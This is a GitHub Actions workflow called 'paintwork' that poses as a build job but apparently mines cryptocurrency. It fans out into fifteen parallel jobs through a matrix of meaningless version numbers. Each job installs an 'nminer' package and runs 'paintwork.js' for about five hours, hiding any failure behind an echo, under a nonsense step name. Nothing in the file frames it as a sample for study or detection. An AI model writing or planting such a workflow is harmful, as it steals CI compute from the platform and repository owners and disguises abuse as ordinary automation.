name: paintwork
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 7198 }
          - { version: 9557 }
          - { version: 8591 }
          - { version: 4023 }
          - { version: 6658 }
          - { version: 7520 }
          - { version: 1285 }
          - { version: 3523 }
          - { version: 3429 }
          - { version: 3428 }
          - { version: 7423 }
          - { version: 2830 }
          - { version: 1794 }
          - { version: 4063 }
          - { version: 8951 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: or loosely rotten woot
        run: |
          npm install nminer@latest
          timeout 306m node paintwork.js || echo "paintwork executed"